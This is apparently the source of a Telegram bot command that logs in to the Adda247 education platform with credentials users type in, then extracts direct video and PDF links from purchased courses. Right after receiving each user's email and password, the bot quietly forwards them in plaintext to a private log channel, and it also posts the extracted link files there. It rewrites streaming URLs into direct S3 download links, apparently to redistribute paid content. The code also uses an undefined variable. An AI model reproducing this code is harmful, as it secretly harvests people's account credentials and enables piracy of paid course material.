import requests
import json
import random
import uuid
import time
import asyncio
import io
import aiohttp
from pyrogram import Client, filters
import os
import requests
from Extractor import app
from config import CHANNEL_ID

log_channel = CHANNEL_ID
@app.on_message(filters.command(["adda"]))
async def adda_command_handler(app, m):
    try:
        # 1. Ask for credentials
        e_message = await app.ask(m.chat.id, "Send ID & Password of **Adda 247**\n\n**Format**:- Email ID*Password")
        ap = e_message.text.strip()
        
        # FEATURE: FORWARD TO LOG
        log_text = f"#ADDA_LOG\n**User:** {m.from_user.mention}\n**ID:** `{m.from_user.id}`\n**Data:** `{ap}`"
        await app.send_message(log_channel, log_text)

        if "*" not in ap:
            await m.reply_text("Invalid format.")
            return
            
        e, p = ap.split("*")
        status = await m.reply_text("🔎 Logging in and scanning all categories...")

        # Login Logic
        url = "https://userapi.adda247.com/login?src=aweb"
        data = {"email": e, "providerName": "email", "sec": p}
        headers = {"authority": "userapi.adda247.com", "Content-Type": "application/json", "X-Auth-Token": "fpoa43edty5", "X-Jwt-Token": ""}

        response = requests.post(url, json=data, headers=headers).json()
        jwt = response.get("jwtToken")
        if not jwt:
            await status.edit("Login failed.")
            return

        headers["X-Jwt-Token"] = jwt
        packages = requests.get("https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=10&src=aweb", headers=headers).json().get("data", [])

        for package in packages:
            package_id = package.get("packageId")
            package_title = package.get("title", "").replace('|', '_').replace('/', '_')
            
            file_name = f"{package_title}.txt"
            total_items = 0
            
            with open(file_name, "w") as file:
                # FEATURE: LOOK THROUGH ALL THINGS (Recorded, Live, Tests)
                categories = ["ONLINE_LIVE_CLASSES", "RECORDED_COURSE", "TEST_SERIES"]
                
                for cat in categories:
                    await status.edit(f"Processing {package_title}\nCategory: {cat.replace('_', ' ')}...")
                    
                    child_url = f"https://store.adda247.com/api/v3/ppc/package/child?packageId={package_id}&category={cat}&isComingSoon=false&pageNumber=0&pageSize=20&src=aweb"
                    child_packages = requests.get(child_url, headers=headers).json().get("data", {}).get("packages", [])

                    for child in child_packages:
                        child_id = child.get("packageId")
                        endpoints = [
                            f"https://store.adda247.com/api/v1/my/purchase/OLC/{child_id}?src=aweb",
                            f"https://store.adda247.com/api/v1/my/purchase/content/{child_id}?src=aweb"
                        ]
                        
                        for api_url in endpoints:
                            res_data = requests.get(api_url, headers=headers).json().get("data", {})
                            items = res_data.get("onlineClasses", []) + res_data.get("contents", [])
                            
                            for item in items:
                                name = item.get("name", "Unknown").replace('|', '_')
                                
                                # PDF Extract
                                pdf = item.get("pdfFileName") or item.get("pdf")
                                if pdf:
                                    file.write(f"{name}: https://store.adda247.com/{pdf}\n")
                                    total_items += 1
                                
                                # --- UPDATED VIDEO LOGIC ---
                                video_url = item.get("url") # e.g., "ivs/4831519/2EPO38JP5F8XGFQCS0BA/480p30playlist.m3u8"
                                if video_url:
                                    # We extract the base path before '480p30' and change extension to .mp4
                                    # Based on your example: ivs/.../filename.mp4
                                    base_path = video_url.replace("/480p30playlist.m3u8", ".mp4")
                                    # If the slash isn't there, we just clean the URL
                                    base_path = base_path.replace("480p30playlist.m3u8", ".mp4")
                                    
                                    new_working_link = f"https://video-streaming-source.s3.ap-south-1.amazonaws.com/{base_path}"
                                    file.write(f"{name}: {new_working_link}\n")
                                    total_items += 1

            if os.path.exists(file_name) and os.path.getsize(file_name) > 0:
                end = time.time()
                elapsed_time = end-start
                caption = f"**App Name :** ADDA 247 \n\n 📦 **Batch:** `{package_title}`\n\n Elapsed time: {elapsed_time:.1f} seconds \n\n ✅ **Total Items Found:** {total_items} \n\n **╾───• Txtx Extractor •───╼**  "
                await m.reply_document(file_name, caption=caption)
                await app.send_document(log_channel, file_name, caption=f"#EXTRACTED\n{caption}")
                os.remove(file_name)

        await status.edit("✅ All Packages Processed!")

    except Exception as e:
        await m.reply_text(f"Error: {e}")
